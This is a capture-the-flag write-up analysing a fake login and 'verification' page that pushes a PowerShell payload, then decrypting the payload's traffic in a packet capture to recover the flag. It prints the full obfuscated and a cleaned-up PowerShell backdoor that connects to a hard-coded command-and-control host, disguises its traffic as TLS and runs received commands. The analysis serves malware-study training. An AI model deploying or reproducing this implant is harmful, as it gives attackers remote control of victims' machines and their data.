---
layout: writeup
title: Fishy Website
tags: misc
---

We are given URL to a login page and packet capture file.

![login_page.png](https://github.com/Cl4r1ty-1/CTF/blob/main/DownUnderCTF%202025/images/login_page.png?raw=true)

On the login there are placeholder credentials, "jdoe" and "Password" so I decide to try and login with those. This seems to work and takes me to a very sketchy looking verification page.

![verify.png](https://github.com/Cl4r1ty-1/CTF/blob/main/DownUnderCTF%202025/images/verify.png?raw=true)

I decide to investigate further by going to the URL in the PowerShell command it tries to get the victim to run. This takes me to a very large base64 encoded PowerShell command

{% highlight powershell %}
powershell -EncodedCommand IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAQgA4ADgAQgA4AEIAOAA4ADgAQgBCAEIAOAA4ACAA... // command snippet
{% endhighlight %}

I decode the command in CyberChef to reveal an obfuscated PowerShell script

{% highlight powershell %}
               $BBB88B8B888BBB88 = 0xf1,
                  0x6e,
    0xcd,
 0xc6,0x79,0x4c,0x66,0xd1,0x02,
          0xf8,0x33,0xc4,0x86,
                 0xe7,0xa4,
                      0x35,0x8d,
  0x69,0xbd,0xd2,0x1d,0x50,0xf5,0xfb,0xdf,0xec,0xaf,
     0x0b,0x9e,0x53,
    0xa4,0xd3
  function IIlIlIlIllIIllIl {
     param([int[]]$BBBB8888BBBBB8BB, [int]$BB8BB8B8BBB8B8B8)
                    $B8B8B8B8B8B8B8BB = ""
             foreach ($B888BB88888BBBBB in $BBBB8888BBBBB8BB) {
                        $B8B8B8B8B8B8B8BB += [char]($B888BB88888BBBBB -bxor $BB8BB8B8BBB8B8B8)
           }
                         return $B8B8B8B8B8B8B8BB
                  }
    function lIIIlllIIIIllllI {
     param (
                         [byte[]]$B8BBB8B8BB8BBB88,
                 [byte[]]$BBB8BBB8B88B88B8
        )
                 $BBB88BB88BB8BBB8 = 0..255
                 $B888B8BB888BB88B = 0
           for ($B8BB8BBB8BB8BBBB = 0; $B8BB8BBB8BB8BBBB -lt 256; $B8BB8BBB8BB8BBBB++) {
                           $B888B8BB888BB88B = ($B888B8BB888BB88B + $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB] + $B8BBB8B8BB8BBB88[$B8BB8BBB8BB8BBBB % $B8BBB8B8BB8BBB88.Length]) % 256
                             $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB], $BBB88BB88BB8BBB8[$B888B8BB888BB88B] = $BBB88BB88BB8BBB8[$B888B8BB888BB88B], $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB]
     }
                     $B8BB8BBB8BB8BBBB = 0
                    $B888B8BB888BB88B = 0
                        $BBBBB8BBB8BBB88B = @()
           foreach ($BBBB88888B888BBB in $BBB8BBB8B88B88B8) {
                             $B8BB8BBB8BB8BBBB = ($B8BB8BBB8BB8BBBB + 1) % 256
                              $B888B8BB888BB88B = ($B888B8BB888BB88B + $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB]) % 256
                            $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB], $BBB88BB88BB8BBB8[$B888B8BB888BB88B] = $BBB88BB88BB8BBB8[$B888B8BB888BB88B], $BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB]
                        $B88BBB888BBB88B8 = $BBB88BB88BB8BBB8[($BBB88BB88BB8BBB8[$B8BB8BBB8BB8BBBB] + $BBB88BB88BB8BBB8[$B888B8BB888BB88B]) % 256]
                       $BBBBB8BBB8BBB88B += ($BBBB88888B888BBB -bxor $B88BBB888BBB88B8)
          }
             return ,$BBBBB8BBB8BBB88B
                }
    function lllIIlIIlIllllll {
                  param ([string]$B888BBBBB8B8B8BB)
              $B888B8B8B88B8BB8 = [System.Text.Encoding]::UTF8.GetBytes($B888BBBBB8B8B8BB)
                   $BBBB8888BBBBB8BB = (lIIIlllIIIIllllI -B8BBB8B8BB8BBB88 $BBB88B8B888BBB88 -BBB8BBB8B88B88B8 $B888B8B8B88B8BB8) + (0x02,0x04,0x06,0x08)
                     $B88BBBBBB888888B = [System.BitConverter]::GetBytes([int16]$BBBB8888BBBBB8BB.Length)
        [Array]::Reverse($B88BBBBBB888888B)
       return (0x17, 0x03, 0x03) + $B88BBBBBB888888B + $BBBB8888BBBBB8BB
                }
             function llIIlllllIIIlllI {
                 $B88B888B8888B888 = (IIlIlIlIllIIllIl -BBBB8888BBBBB8BB @(168,187,172,183,184,167,240,186,171,169,176,177,176,186,187,172,240,189,177,179) -BB8BB8B8BBB8B8B8 222)
          $BBBB8B8BB888B88B = [System.Text.Encoding]::ASCII.GetBytes($B88B888B8888B888)
            $BB88BBBB88B8888B = [byte[]] ([BitConverter]::GetBytes([UInt16]$BBBB8B8BB888B88B.Length))
                          [Array]::Reverse($BB88BBBB88B8888B)
                       $B88888B888888BB8 = @(0x00) + $BB88BBBB88B8888B + $BBBB8B8BB888B88B
                   $BB8BBBB8B8888BB8 = [byte[]] ([BitConverter]::GetBytes([UInt16]$B88888B888888BB8.Length))
                       [Array]::Reverse($BB8BBBB8B8888BB8)
         $B8888B88BB888B88 = $BB8BBBB8B8888BB8 + $B88888B888888BB8
              $B888B888BBB8B8BB = [byte[]] ([BitConverter]::GetBytes([UInt16]$B8888B88BB888B88.Length))
        [Array]::Reverse($B888B888BBB8B8BB)
                     $B8BB88BBBB8B88B8 = @(0x00,
                0x00) + $B888B888BBB8B8BB + $B8888B88BB888B88
                 $BBBB88B8BB88B88B = @(0x00, 0x0b,0x00,0x04,0x03,0x00,0x01,0x02,
                                 0x00,0x0a,0x00,0x16,0x00,0x14,0x00,0x1d,0x00,0x17,0x00,0x1e,0x00,0x19,0x00,0x18,0x01,0x00,0x01,0x01,0x01,0x02,0x01,0x03,0x01,0x04,
                                            0x00,0x23,0x00,0x00,
                              0x00,0x16,0x00,0x00,
                                      0x00,0x17,0x00,0x00,
                                    0x00,0x0d,0x00,0x1e,0x00,0x1c,0x04,0x03,0x05,0x03,0x06,0x03,0x08,0x07,0x08,0x08,0x08,0x09,0x08,0x0a,0x08,0x0b,0x08,0x04,0x08,0x05,0x08,0x06,0x04,0x01,0x05,0x01,0x06,0x01,
                                      0x00,0x2b,0x00,0x03,0x02,0x03,0x04,
                             0x00,0x2d,0x00,0x02,0x01,0x01,
                                   0x00,0x33,0x00,0x26,0x00,0x24,0x00,0x1d,0x00,0x20,
                          0x35,0x80,0x72,0xd6,0x36,0x58,0x80,0xd1,0xae,0xea,0x32,0x9a,0xdf,0x91,0x21,0x38,0x38,0x51,0xed,0x21,0xa2,0x8e,0x3b,0x75,0xe9,0x65,0xd0,0xd2,0xcd,0x16,0x62,0x54)
           $BB88BB8BB88BB88B = $B8BB88BBBB8B88B8 + $BBBB88B8BB88B88B
          $BBBB8B88888888B8 = [byte[]] ([BitConverter]::GetBytes([UInt16]$BB88BB8BB88BB88B.Length))
         [Array]::Reverse($BBBB8B88888888B8)
     $B8888BBB888B8888 = @(0x03,0x03,0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0a,0x0b,0x0c,
                        0x0d,0x0e,0x0f,
               0x10,0x11,0x12,0x13,0x14,0x15,0x16,0x17,
                        0x18,
               0x19,0x1a,0x1b,0x1c,0x1d,0x1e,0x1f,0x20,0xe0,0xe1,
                   0xe2,0xe3,0xe4,0xe5,0xe6,0xe7,0xe8,0xe9,0xea,0xeb,0xec,0xed,0xee,0xef,0xf0,0xf1,0xf2,0xf3,0xf4,0xf5,0xf6,0xf7,0xf8,0xf9,0xfa,
                     0xfb,0xfc,0xfd,0xfe,0xff,0x00,0x08,0x13,0x02,0x13,0x03,0x13,0x01,0x00,0xff,0x01,0x00)
          $BB8B8BBBB88B8B8B = $B8888BBB888B8888 + $BBBB8B88888888B8 + $BB88BB8BB88BB88B
             $BB8BBB88B8B8B888 = [byte[]] ([BitConverter]::GetBytes($BB8B8BBBB88B8B8B.Length))
        [Array]::Reverse($BB8BBB88B8B8B888)
     $BBB88BBB888B8B8B = @(0x01) + $BB8BBB88B8B8B888[1..3] + $BB8B8BBBB88B8B8B
        $B88B888B8BB8BBBB = [byte[]] ([BitConverter]::GetBytes([UInt16]$BBB88BBB888B8B8B.Length))
         [Array]::Reverse($B88B888B8BB8BBBB)
                      $BBB888888BB88B88 = @(0x16,
                   0x03, 0x01) + $B88B888B8BB8BBBB + $BBB88BBB888B8B8B
       return ,$BBB888888BB88B88
                 }
 $BBBB8BBBBBB8B88B = New-Object System.Net.Sockets.TcpClient
                    $BBBB8BBBBBB8B88B.Connect((IIlIlIlIllIIllIl -BBBB8888BBBBB8BB @(5,7,25,2,25,3,15,25,5,7,7) -BB8BB8B8BBB8B8B8 55), ((50 * 9) - (11 * 2)) + [math]::Pow(2, 3) + [math]::Sqrt(49))
      $BBBB888888B88BBB = $BBBB8BBBBBB8B88B.GetStream()
 $BB88888BB8B8B8BB = llIIlllllIIIlllI
        $BBBB888888B88BBB.Write($BB88888BB8B8B8BB, 0, $BB88888BB8B8B8BB.Length)
        $B8B888BB8B8888BB = New-Object byte[] 16384
          $BBBB888888B88BBB.Read($B8B888BB8B8888BB, 0, $B8B888BB8B8888BB.Length) | Out-Null
                  while ($true) {
              $B8B888BB8B8888BB = New-Object byte[] 16384
      try {
                     $B888BBB8B8B88B8B = $BBBB888888B88BBB.Read($B8B888BB8B8888BB, 0, 16384)
                 } catch {
                    break
              }
                        $BBBB8888BBBBB8BB = $B8B888BB8B8888BB[5..($B888BBB8B8B88B8B - 1)]
                $B8B88B8BB888BBB8 = [System.Text.Encoding]::UTF8.GetString((lIIIlllIIIIllllI -B8BBB8B8BB8BBB88 $BBB88B8B888BBB88 -BBB8BBB8B88B88B8 $BBBB8888BBBBB8BB))
                         if ($B8B88B8BB888BBB8 -eq (IIlIlIlIllIIllIl -BBBB8888BBBBB8BB @(109,112,97,124) -BB8BB8B8BBB8B8B8 8)) { break }
                      try {
                             $BB88B8B8BBBB888B = (Invoke-Expression $B8B88B8BB888BBB8 2>&1) | Out-String
                      } catch {
                   $BB88B8B8BBBB888B = (IIlIlIlIllIIllIl -BBBB8888BBBBB8BB @(186,141,141,144,141) -BB8BB8B8BBB8B8B8 255)
      }
          $BBBB8BB88BB888B8 = lllIIlIIlIllllll -B888BBBBB8B8B8BB $BB88B8B8BBBB888B.Trim()
                       $BBBB888888B88BBB.Write($BBBB8BB88BB888B8, 0, $BBBB8BB88BB888B8.Length)
            }
              $BBBB888888B88BBB.Close()
                $BBBB8BBBBBB8B88B.Close()
{% endhighlight %}

After cleaning this mess up a bit I end with up the script

{% highlight powershell %}
# XOR Decryptor
function Decrypt-XOR {
    param([int[]]$data, [int]$key)
    return -join ($data | ForEach-Object { [char]($_ -bxor $key) })
}

# RC4-like encryption/decryption
function RC4-Transform {
    param ([byte[]]$key, [byte[]]$data)
    $S = 0..255
    $j = 0
    for ($i = 0; $i -lt 256; $i++) {
        $j = ($j + $S[$i] + $key[$i % $key.Length]) % 256
        $S[$i], $S[$j] = $S[$j], $S[$i]
    }
    $i = 0
    $j = 0
    $output = @()
    foreach ($byte in $data) {
        $i = ($i + 1) % 256
        $j = ($j + $S[$i]) % 256
        $S[$i], $S[$j] = $S[$j], $S[$i]
        $k = $S[($S[$i] + $S[$j]) % 256]
        $output += ($byte -bxor $k)
    }
    return ,$output
}

# Packet builder for command output (TLS-like)
function Build-Packet {
    param ([string]$data)
    $dataBytes = [System.Text.Encoding]::UTF8.GetBytes($data)
    $key = @(0xf1,0x6e,0xcd,0xc6,0x79,0x4c,0x66,0xd1,0x02,0xf8,0x33,0xc4,0x86,0xe7,0xa4,0x35,0x8d,0x69,0xbd,0xd2,0x1d,0x50,0xf5,0xfb,0xdf,0xec,0xaf,0x0b,0x9e,0x53,0xa4,0xd3)
    $encData = RC4-Transform -key $key -data $dataBytes + @(0x02,0x04,0x06,0x08)
    $lenBytes = [BitConverter]::GetBytes([int16]$encData.Length)
    [Array]::Reverse($lenBytes)
    return @(0x17, 0x03, 0x03) + $lenBytes + $encData
}

# Build initial ClientHello (TLS spoof)
function Build-ClientHello {
    $host = Decrypt-XOR @(168,187,172,183,184,167,240,186,171,169,176,177,176,186,187,172,240,189,177,179) 222
    $hostBytes = [System.Text.Encoding]::ASCII.GetBytes($host)
    $hostLen = [BitConverter]::GetBytes([UInt16]$hostBytes.Length)
    [Array]::Reverse($hostLen)
    $payload = @(0x00) + $hostLen + $hostBytes
    $length = [BitConverter]::GetBytes([UInt16]$payload.Length)
    [Array]::Reverse($length)
    $finalPayload = @(0x00,0x00) + $length + $payload

    # + huge TLS extensions block omitted for brevity
    # Return the whole thing (mimics TLS ClientHello)
    return ,@(0x16,0x03,0x01) + ... + $finalPayload  # Real code builds this
}

# Connect to C2
$host = Decrypt-XOR @(5,7,25,2,25,3,15,25,5,7,7) 55  # "c2.l33t.io"
$port = 443
$tcpClient = New-Object System.Net.Sockets.TcpClient
$tcpClient.Connect($host, $port)
$stream = $tcpClient.GetStream()

# Send handshake
$hello = Build-ClientHello
$stream.Write($hello, 0, $hello.Length)

# Read dummy response
$buffer = New-Object byte[] 16384
$stream.Read($buffer, 0, $buffer.Length) | Out-Null

# Command loop
while ($true) {
    $buffer = New-Object byte[] 16384
    try {
        $bytesRead = $stream.Read($buffer, 0, 16384)
    } catch {
        break
    }
    $data = $buffer[5..($bytesRead - 1)]
    $decrypted = RC4-Transform -key $key -data $data
    $command = [System.Text.Encoding]::UTF8.GetString($decrypted)

    if ($command -eq "exit") { break }

    try {
        $output = (Invoke-Expression $command 2>&1) | Out-String
    } catch {
        $output = "Error"
    }

    $packet = Build-Packet -data $output.Trim()
    $stream.Write($packet, 0, $packet.Length)
}

$stream.Close()
$tcpClient.Close()
{% endhighlight %}

This script connects to a c2 server and tries to hide in the network by acting as TLS. It encrypts the payloads with RC4 with the key `f16ecdc6794c66d102f833c486e7a4358d69bdd21d50f5fbdfecaf0b9e53a4d3` and sends it to the c2.

After working out what type of traffic I'm looking for I decide to open the packet capture in Wireshark.

Since one of the commands the script is looking for from the c2 is "exit" I decide to search for that string encrypted with the key extracted from the script. "exit" encrypted is `66798f8f` so the filter I use in Wireshark is `tcp contains 66:79:8f:8f` which checks all TCP packets (as the script uses TCP/TLS) for the bytes `66798f8f`. Low and behold one packet is found from the IP address `20.5.48.200`.

![CTF/DownUnderCTF 2025/images/wireshark1.png](https://github.com/Cl4r1ty-1/CTF/blob/main/DownUnderCTF%202025/images/wireshark1.png?raw=true)

I decide to look at all the data going to and from this address using the `ip.addr` filter and from this I can map out a pretty good idea of what happened.

![wireshark2.png](https://github.com/Cl4r1ty-1/CTF/blob/main/DownUnderCTF%202025/images/wireshark2.png?raw=true)

From this screenshot we can see that the victim of the malware got the script from the original website. The machine then connects to the c2 server and there is a stream on TLS Application Data following. I to use the filter `((ip.addr == 20.5.48.200)) && (tls.record.opaque_type == 23)` to hone in on those application data packets. I try to decrypt the data from one of these packets in CyberChef with RC4 and the key found in the script and that gives me some readable commands!

![cyberchef1.png](https://github.com/Cl4r1ty-1/CTF/blob/main/DownUnderCTF%202025/images/cyberchef1.png?raw=true)

At this point I just start decrypting all these packets until I find something interesting. Eventually I get to some data that when decrypted is some base64 encoded data. After decoding this I find that it is a .tar.gz file being sent to the c2 server! I decompress the file and inside is a `keys.txt` file which hold the flag!

![cyberchef2.png](https://github.com/Cl4r1ty-1/CTF/blob/main/DownUnderCTF%202025/images/cyberchef2.png?raw=true)

Flag: `DUCTF{1_gu355_y0u_c4n_d3cRyPT_TLS_tr4ff1c}`
